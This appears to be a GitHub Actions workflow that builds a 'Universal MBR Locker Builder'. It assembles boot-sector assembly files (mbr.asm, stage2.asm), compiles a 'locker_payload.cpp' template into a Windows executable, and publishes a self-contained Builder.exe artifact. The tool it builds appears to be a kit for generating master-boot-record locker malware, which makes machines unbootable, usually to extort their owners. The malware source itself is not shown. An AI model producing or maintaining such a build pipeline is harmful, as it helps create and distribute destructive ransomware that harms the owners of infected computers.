name: Build Universal MBR Locker Builder

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Install MinGW (GCC for Windows)
      run: |
        choco install mingw -y
        echo "C:\tools\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append

    - name: Download NASM
      shell: cmd
      run: |
        curl -L -o nasm.zip https://www.nasm.us/pub/nasm/releasebuilds/2.16.03/win64/nasm-2.16.03-win64.zip
        7z x nasm.zip -y
        mkdir builder\Resources 2>nul
        for /d %%i in (nasm-*) do copy "%%i\nasm.exe" builder\Resources\nasm.exe
        if exist builder\Resources\nasm.exe (
          echo [SUCCESS] NASM downloaded and copied
        ) else (
          echo [ERROR] NASM not found!
          exit /b 1
        )

    - name: Copy ASM files to Resources
      shell: cmd
      run: |
        mkdir builder\Resources 2>nul
        copy locker\mbr.asm builder\Resources\mbr.asm
        copy locker\stage2.asm builder\Resources\stage2.asm
        echo [SUCCESS] ASM files copied

    - name: Setup .NET
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: 6.0.x

    - name: Compile Template (Universal 32-bit)
      shell: cmd
      run: |
        set PATH=C:\tools\mingw64\bin;%PATH%
        cd template
        i686-w64-mingw32-g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
        if exist locker_payload.exe (
          mkdir ..\builder\Resources 2>nul
          copy locker_payload.exe ..\builder\Resources\template.exe
          echo [SUCCESS] Template compiled (32-bit, universal)
        ) else (
          echo [ERROR] Compilation failed!
          exit /b 1
        )

    - name: List Resources folder (diagnostic)
      shell: cmd
      run: |
        echo === FILES IN builder\Resources ===
        dir builder\Resources
        echo ================================

    - name: Build Universal Builder (AnyCPU + Self-Contained)
      shell: cmd
      run: |
        cd builder
        dotnet restore
        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:Platform=AnyCPU -o ../output
        if exist ..\output\Builder.exe (
          echo [SUCCESS] Builder built successfully
        ) else (
          echo [ERROR] Builder build failed!
          exit /b 1
        )

    - name: Upload Builder
      uses: actions/upload-artifact@v4
      with:
        name: MbrLockerBuilder
        path: |
          output/
          !output/*.pdb
        if-no-files-found: error
